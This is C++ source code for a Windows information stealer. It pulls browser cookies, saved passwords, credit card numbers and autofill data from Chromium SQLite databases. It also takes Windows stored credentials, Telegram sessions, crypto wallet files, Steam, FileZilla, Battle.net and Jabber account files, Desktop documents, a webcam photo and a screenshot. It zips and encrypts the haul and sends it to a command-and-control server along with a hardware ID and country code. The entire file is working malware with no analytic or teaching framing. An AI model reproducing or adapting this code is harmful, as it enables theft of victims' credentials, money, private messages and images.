#include <windows.h>
#include <shlwapi.h>
#include <type_traits>
#include <wincred.h>
#include "telegram.h"
#include "sqlite3.h"
#include "export.h"
#include "search.h"
#include "vector.h"
#include "parson.h"
#include "parse.h"
#include "crypt.h"
#include "cred.h"
#include "fncs.h"
#include "mem.h"
#include "cnc.h"
#include "zip.h"
#include "ldr.h"

void enumCookies(HZIP hZip, SIZE_T* count) {
	vector v;
	vector_init(&v);
	LPCWSTR appdata = resolveEnvrimoment(L"LOCALAPPDATA");
	searchImpl(appdata, &v, CRC32_STR(L"Cookies"));
	_free((void*)appdata);

	for (int i = 0; i < vector_count(&v); i++) {
		WCHAR* wc = (WCHAR*)vector_get(&v, i);

		int prefix_len = 0;
		int encrypted_cols_index_list[1] = { 7 };
		const char* prefix[] = { 0, "\t", "\t", "\t", "\t", "\t", "\t" };

		for (int i = 0; i < _countof(prefix); i++) {
			prefix_len += lstrlenA(prefix[i]);
		}

		LPCSTR query = "SELECT host_key, is_httponly, path, is_secure, expires_utc, name, encrypted_value FROM cookies";
		vector sqlite_v = sqliteProcessFunction(wc, count, query, "\r\n", /*\R\N*/0, 7,
			encrypted_cols_index_list, (char**)prefix, 1);

		SIZE_T s = 0;
		CHAR* c = 0;
		vec_get_str(sqlite_v, &c, &s, prefix_len);

		if (c) {
			SIZE_T tc;
			randomInt(&tc, 100, 999);
			WCHAR* name = (WCHAR*)_alloc(MAX_PATH * sizeof(WCHAR));
			wnsprintfW(name, MAX_PATH, L"CB.cookies.%u.txt", tc);
			ZipAdd((HZIP)hZip, name, c, s);
			_free(name);

			_free(c);
			vector_free(&sqlite_v);
		}
		_free(wc);

	}
	vector_free(&v);
}

void enumPasswords(HZIP hZip, SIZE_T* count) {
	vector v;
	vector_init(&v);
	LPCWSTR appdata = resolveEnvrimoment(L"LOCALAPPDATA");
	searchImpl(appdata, &v, CRC32_STR(L"Login Data"));
	_free((void*)appdata);

	for (int i = 0; i < vector_count(&v); i++) {
		WCHAR* wc = (WCHAR*)vector_get(&v, i);

		int prefix_len = 0;
		int encrypted_cols_index_list[1] = { 3 };
		const char* prefix[] = { "Url: ", "Username: ", "Password: " };

		for (int i = 0; i < _countof(prefix); i++) {
			prefix_len += lstrlenA(prefix[i]);
		}

		LPCSTR query = "SELECT signon_realm, username_value, password_value FROM logins";
		vector sqlite_v = sqliteProcessFunction(wc, count, query, "\r\n", /*\R\N*/1, 3,
			encrypted_cols_index_list, (char**)prefix, 1);

		SIZE_T s = 0;
		CHAR* c = 0;
		vec_get_str(sqlite_v, &c, &s, prefix_len);
		if (c) {
			SIZE_T tc;
			randomInt(&tc, 100, 999);
			WCHAR* name = (WCHAR*)_alloc(MAX_PATH * sizeof(WCHAR));
			wnsprintfW(name, MAX_PATH, L"CB.passwords.%u.txt", tc);
			ZipAdd((HZIP)hZip, name, c, s);
			_free(name);

			_free(c);
			vector_free(&sqlite_v);
		}
		_free(wc);
	}
	vector_free(&v);
}

void enumInternetexplorer(HZIP hZip, SIZE_T* count) {
	vector v;
	vector_init(&v);
	enumCredentials(&v, count);

	SIZE_T s = 0;
	CHAR* c = 0;
	vec_get_str(v, &c, &s, 1);

	if (c) {
		SIZE_T tc;
		randomInt(&tc, 100, 999);
		WCHAR* name = (WCHAR*)_alloc(MAX_PATH * sizeof(WCHAR));
		wnsprintfW(name, MAX_PATH, L"Credentials.%u.txt", tc);
		ZipAdd((HZIP)hZip, name, c, s);

		_free(name);
	}
	_free(c);
	vector_free(&v);
}

void enumCreditcards(HZIP hZip, SIZE_T* count) {
	vector v;
	vector_init(&v);
	LPCWSTR appdata = resolveEnvrimoment(L"LOCALAPPDATA");
	searchImpl(appdata, &v, CRC32_STR(L"Web Data"));
	_free((void*)appdata);

	for (int i = 0; i < vector_count(&v); i++) {
		WCHAR* wc = (WCHAR*)vector_get(&v, i);

		int prefix_len = 0;
		int encrypted_cols_index_list[1] = { 1 };
		const char* prefix[] = { "Number: ", "Mounth: ", "Year: ", "Name: ", "Web Site: " };

		for (int i = 0; i < _countof(prefix); i++) {
			prefix_len += lstrlenA(prefix[i]);
		}

		LPCSTR query = "SELECT card_number_encrypted, expiration_month, expiration_year, name_on_card, origin FROM credit_cards";
		vector sqlite_v = sqliteProcessFunction(wc, count, query, "\r\n", /*\R\N*/1, 5,
			encrypted_cols_index_list, (char**)prefix, 1);

		SIZE_T s = 0;
		CHAR* c = 0;
		vec_get_str(sqlite_v, &c, &s, prefix_len);

		if (c) {
			SIZE_T tc;
			randomInt(&tc, 100, 999);
			WCHAR* name = (WCHAR*)_alloc(MAX_PATH * sizeof(WCHAR));
			wnsprintfW(name, MAX_PATH, L"CB.cards.%u.txt", tc);
			ZipAdd((HZIP)hZip, name, c, s);
			_free(name);

			_free(c);
			vector_free(&sqlite_v);
		}
		_free(wc);
	}
	vector_free(&v);
}

void enumAutofill(HZIP hZip, SIZE_T* count) {
	vector v;
	vector_init(&v);
	LPCWSTR appdata = resolveEnvrimoment(L"LOCALAPPDATA");
	searchImpl(appdata, &v, CRC32_STR(L"Web Data"));
	_free((void*)appdata);

	for (int i = 0; i < vector_count(&v); i++) {
		WCHAR* wc = (WCHAR*)vector_get(&v, i);

		int prefix_len = 0;
		const char* prefix[] = { "Id: ", "Value: " };

		for (int i = 0; i < _countof(prefix); i++) {
			prefix_len += lstrlenA(prefix[i]);
		}

		LPCSTR query = "SELECT name, value FROM autofill";
		vector sqlite_v = sqliteProcessFunction(wc, count, query, "\r\n", /*\R\N*/TRUE, 2, 0, (char**)prefix, 0);

		SIZE_T s = 0;
		CHAR* c = 0;
		vec_get_str(sqlite_v, &c, &s, prefix_len);

		if (c) {
			SIZE_T tc;
			randomInt(&tc, 100, 999);
			WCHAR* name = (WCHAR*)_alloc(MAX_PATH * sizeof(WCHAR));
			wnsprintfW(name, MAX_PATH, L"CB.autofill.%u.txt", tc);
			ZipAdd((HZIP)hZip, name, c, s);
			_free(name);

			_free(c);
			vector_free(&sqlite_v);
		}
		_free(wc);
	}
	vector_free(&v);
}

void enumCrypto(HZIP hZip, SIZE_T* count) {
	LPCWSTR appdata = resolveEnvrimoment(L"APPDATA");
	LPCWSTR list[] = { L"wallet", L"bitcoin", L"bither" };
	parserImpl(list, count, 3, L"Crypto", TRUE, (HZIP)hZip, appdata);
	_free((void*)appdata);
}

void enumUserprofile(HZIP hZip, SIZE_T* count) {
	LPCWSTR userprofile = resolveEnvrimoment(L"USERPROFILE");
	lstrcatW((WCHAR*)userprofile, L"\\Desktop");

	LPCWSTR list[] = { L".txt", L".doc" };
	parserImpl(list, count, 2, L"Userprofile", TRUE, (HZIP)hZip, userprofile, TRUE);
	_free((void*)userprofile);
}

void enumSteam(HZIP hZip, SIZE_T* count) {
	HKEY key = NULL;
	LSTATUS os = RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Valve\\Steam", &key);
	if (os == ERROR_SUCCESS && key != NULL)
	{
		WCHAR value[MAX_PATH];
		DWORD value_length = MAX_PATH;
		DWORD tpe = REG_SZ;
		LSTATUS qs = RegQueryValueExW(key, L"InstallPath", NULL, &tpe, (LPBYTE)&value, &value_length);
		if (qs == ERROR_SUCCESS && value != 0) {

			LPCWSTR list[] = { L"loginusers.vdf", L"config.vdf", L"ssfn" };
			if(pathExists(value, FALSE))
				parserImpl(list, count, 3, L"Steam Files", TRUE, (HZIP)hZip, value);
		}
	}
}

void enumFilezilla(HZIP hZip, SIZE_T* count) {
	LPCWSTR appdata = resolveEnvrimoment(L"APPDATA");
	lstrcatW((WCHAR*)appdata, L"\\FileZilla");

	if(pathExists(appdata, FALSE))
		parserImpl(0, count, 0, L"File Zilla", FALSE, (HZIP)hZip, appdata);

	_free((void*)appdata);
}

void enumBattlenet(HZIP hZip, SIZE_T* count) {
	LPCWSTR appdata = resolveEnvrimoment(L"APPDATA");
	lstrcatW((WCHAR*)appdata, L"\\Battle.net");

	if (pathExists(appdata, FALSE)) {
		LPCWSTR list[] = { L".config", L".db" };
		parserImpl(list, count, 2, L"Battle.net", TRUE, (HZIP)hZip, appdata);
	}
	_free((void*)appdata);
	
	appdata = resolveEnvrimoment(L"LOCALAPPDATA");
	lstrcatW((WCHAR*)appdata, L"\\Battle.net");

	if (pathExists(appdata, FALSE)) {
		LPCWSTR list[] = { L".config", L".db" };
		parserImpl(list, count, 2, L"Battle.net", TRUE, (HZIP)hZip, appdata);
	}
	_free((void*)appdata);
}

void enumJabber(HZIP hZip, SIZE_T* count) {
	LPCWSTR appdata = resolveEnvrimoment(L"APPDATA");
	lstrcatW((WCHAR*)appdata, L"\\.purple\\accounts.xml");

	if (pathExists(appdata, TRUE)) {
		ZipAdd(hZip, L"Jabber\\pidgin.txt", appdata);
		*count += 1;
	}
	_free((void*)appdata);
	
	appdata = resolveEnvrimoment(L"APPDATA");
	lstrcatW((WCHAR*)appdata, L"\\Psi\\profiles\\default\\accounts.xml");

	if (pathExists(appdata, TRUE)) {
		ZipAdd(hZip, L"Jabber\\psi.txt", appdata);
		*count += 1;
	}
	_free((void*)appdata);
	
	appdata = resolveEnvrimoment(L"APPDATA");
	lstrcatW((WCHAR*)appdata, L"\\Psi+\\profiles\\default\\accounts.xml");

	if (pathExists(appdata, TRUE)) {
		ZipAdd(hZip, L"Jabber\\psi+.txt", appdata);
		*count += 1;
	}
	_free((void*)appdata);
}

void enumRDP(HZIP hZip, SIZE_T* count) {
	CHAR* credentialsdata = (CHAR*)_alloc(32767);
	DWORD dwCount = 0;
	PCREDENTIALW *pCredential = NULL;
	if (CredEnumerateW(NULL, 0, &dwCount, &pCredential))
	{
		for (int i = 0; i < dwCount; i++)
		{
			if (NULL != pCredential[i]->TargetName)
			{
				if (CRED_TYPE_GENERIC == pCredential[i]->Type)
				{
					if (NULL != pCredential[i]->UserName
						&& NULL != pCredential[i]->CredentialBlob)
					{
						count += 1;
						wnsprintfA(credentialsdata + lstrlenA(credentialsdata), 32767, "\r\n%s : %s", pCredential[i]->UserName, (WCHAR*)pCredential[i]->CredentialBlob);
					}
					count += 1;
					wnsprintfA(credentialsdata + lstrlenA(credentialsdata), 32767, "\r\n%s : (null)", pCredential[i]->UserName);
				}
				else if (CRED_TYPE_DOMAIN_PASSWORD == pCredential[i]->Type)
				{
					count += 1;
					wnsprintfA(credentialsdata + lstrlenA(credentialsdata), 32767, "\r\n(null) : %s", pCredential[i]->UserName);
				}
			}
		}
		CredFree(pCredential);
	}

	ZipAdd(hZip, L"WinCred.txt", credentialsdata, lstrlenA(credentialsdata));
}


void enumWebcam(HZIP hZip, SIZE_T* webcam_count) {
	WCHAR* mem = (WCHAR*)_alloc(32767 * sizeof(WCHAR));
	GetEnvironmentVariableW(L"TEMP", mem, 32767);
	lstrcatW(mem, L"\\webcam.bmp");
	captureCam(mem);
	if(ZipAdd(hZip, L"WebCam.bmp", mem) == ZR_OK) *webcam_count = 1;
	DeleteFileW(mem);
}

void enumScreenshot(HZIP hZip, SIZE_T* webcam_count) {
	WCHAR* mem = (WCHAR*)_alloc(32767 * sizeof(WCHAR));
	GetEnvironmentVariableW(L"TEMP", mem, 32767);
	lstrcatW(mem, L"\\screenshot.bmp");
	captureScreenshot(mem);
	if(ZipAdd(hZip, L"Screenshot.bmp", mem) == ZR_OK) *webcam_count = 1;
	DeleteFileW(mem);
}

void procCredentials(HZIP hZip, SIZE_T* tg_count, SIZE_T* autofill_count, SIZE_T* cc_count, SIZE_T* passws_count, SIZE_T* ck_count,
	SIZE_T* ie_count, SIZE_T* crypto_count, SIZE_T* steam_count, SIZE_T* fz_count, SIZE_T* bn_count, SIZE_T* jabber_count, 
	SIZE_T* webcam_count, SIZE_T* screen_count, SIZE_T* userprofile_count) {
	LPCWSTR tg_path = resolveEnvrimoment(L"APPDATA");
	lstrcatW((WCHAR*)tg_path, L"\\Telegram Desktop\\tdata");

	enumTelegram(hZip, tg_path, tg_count);
	enumAutofill(hZip, autofill_count);
	enumCreditcards(hZip, cc_count);
	enumPasswords(hZip, passws_count);
	enumCookies(hZip, ck_count);
	enumInternetexplorer(hZip, ie_count);
	enumCrypto(hZip, crypto_count);
	enumSteam(hZip, steam_count);
	enumFilezilla(hZip, fz_count);
	enumBattlenet(hZip, bn_count);
	enumJabber(hZip, jabber_count);
	enumWebcam(hZip, webcam_count);
	enumScreenshot(hZip, screen_count);
	enumUserprofile(hZip, userprofile_count);

	WCHAR* sys_info = (WCHAR*)getSystemInfoW();
	ZipAdd(hZip, L"System.txt", sys_info, lstrlenW(sys_info) * sizeof(WCHAR));

	_free(sys_info);
	_free((WCHAR*)tg_path);
}

extern "C" __declspec(dllexport) void exportData() {
	DWORD dw;
	void* buf;
	unsigned long len;

	JSON_Value* root_value = json_value_init_object();
	JSON_Object* root_object = json_value_get_object(root_value);

	HZIP hZip = CreateZip(0, 104857600, 0);

	SIZE_T tg = 0, af = 0, cc = 0, ps = 0, ck = 0, ie = 0, crypto = 0, steam = 0, fz = 0, battlenet = 0, jabber = 0, webcam = 0, screen = 0,
		userprofile = 0;
	procCredentials(hZip, &tg, &af, &cc, &ps, &ck, &ie, &crypto, &steam, &fz, &battlenet, &jabber, &webcam, &screen, &userprofile);

	ZipGetMemory(hZip, &buf, &len);

	BYTE* crypt_key = 0;
	do {
		CryptGenKey(&crypt_key);
	} while (crypt_key == 0);

	TRAFFIC_ENCRYPT(crypt_key, (unsigned char*)buf, len);

	SIZE_T log_outlen;
	SIZE_T key_outlen;
	LPSTR base64_log = base64Encode((unsigned char*)buf, len, &log_outlen);
	LPSTR base64_key = base64Encode((unsigned char*)crypt_key, 256, &key_outlen);
	LPCSTR country_code = genCountry();
	LPCSTR hwid = genHwid();

	json_object_set_string(root_object, "log", base64_log);
	json_object_set_string(root_object, "key", base64_key);
	json_object_set_string(root_object, "hwid", hwid);
	json_object_set_string(root_object, "country", country_code);

	json_object_set_number(root_object, "telegram", tg);
	json_object_set_number(root_object, "autofill", af);
	json_object_set_number(root_object, "cc", cc);
	json_object_set_number(root_object, "passwords", ps);
	json_object_set_number(root_object, "cookies", ck);
	json_object_set_number(root_object, "ie", ie);
	json_object_set_number(root_object, "crypto", crypto);
	json_object_set_number(root_object, "steam", steam);
	json_object_set_number(root_object, "filezilla", fz);
	json_object_set_number(root_object, "battlenet", battlenet);
	json_object_set_number(root_object, "jabber", jabber);
	json_object_set_number(root_object, "webcam", webcam);
	json_object_set_number(root_object, "screen", screen);
	json_object_set_number(root_object, "userprofile", userprofile);

	int json_size = json_serialization_size(root_value) - 1;
	char *serialized_string = json_serialize_to_string(root_value);

	sendLogsToCNC(API_URL, (char*)serialized_string, json_size);

	json_free_serialized_string(serialized_string);
	json_value_free(root_value);

	_free((void*)hwid);
	_free((void*)base64_log);
	_free((void*)base64_key);
	_free((void*)country_code);
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd ) {
	DWORD dw;
	void* buf;
	unsigned long len;

	JSON_Value* root_value = json_value_init_object();
	JSON_Object* root_object = json_value_get_object(root_value);

	HZIP hZip = CreateZip(0, 104857600, 0);

	SIZE_T tg = 0, af = 0, cc = 0, ps = 0, ck = 0, ie = 0, crypto = 0, steam = 0, fz = 0, battlenet = 0, jabber = 0, webcam = 0, screen = 0,
		userprofile = 0;
	procCredentials(hZip, &tg, &af, &cc, &ps, &ck, &ie, &crypto, &steam, &fz, &battlenet, &jabber, &webcam, &screen, &userprofile);

	ZipGetMemory(hZip, &buf, &len);

	BYTE* crypt_key = 0;
	do {
		CryptGenKey(&crypt_key);
	} while (crypt_key == 0);

	TRAFFIC_ENCRYPT(crypt_key, (unsigned char*)buf, len);

	SIZE_T log_outlen;
	SIZE_T key_outlen;
	LPSTR base64_log = base64Encode((unsigned char*)buf, len, &log_outlen);
	LPSTR base64_key = base64Encode((unsigned char*)crypt_key, 256, &key_outlen);
	LPCSTR country_code = genCountry();
	LPCSTR hwid = genHwid();

	json_object_set_string(root_object, "log", base64_log);
	json_object_set_string(root_object, "key", base64_key);
	json_object_set_string(root_object, "hwid", hwid);
	json_object_set_string(root_object, "country", country_code);

	json_object_set_number(root_object, "telegram", tg);
	json_object_set_number(root_object, "autofill", af);
	json_object_set_number(root_object, "cc", cc);
	json_object_set_number(root_object, "passwords", ps);
	json_object_set_number(root_object, "cookies", ck);
	json_object_set_number(root_object, "ie", ie);
	json_object_set_number(root_object, "crypto", crypto);
	json_object_set_number(root_object, "steam", steam);
	json_object_set_number(root_object, "filezilla", fz);
	json_object_set_number(root_object, "battlenet", battlenet);
	json_object_set_number(root_object, "jabber", jabber);
	json_object_set_number(root_object, "webcam", webcam);
	json_object_set_number(root_object, "screen", screen);
	json_object_set_number(root_object, "userprofile", userprofile);

	int json_size = json_serialization_size(root_value) - 1;
	char *serialized_string = json_serialize_to_string(root_value);

	sendLogsToCNC(API_URL, (char*)serialized_string, json_size);

	json_free_serialized_string(serialized_string);
	json_value_free(root_value);

	_free((void*)hwid);
	_free((void*)base64_log);
	_free((void*)base64_key);
	_free((void*)country_code);
	//runLdr();
	//selfDestruct();
}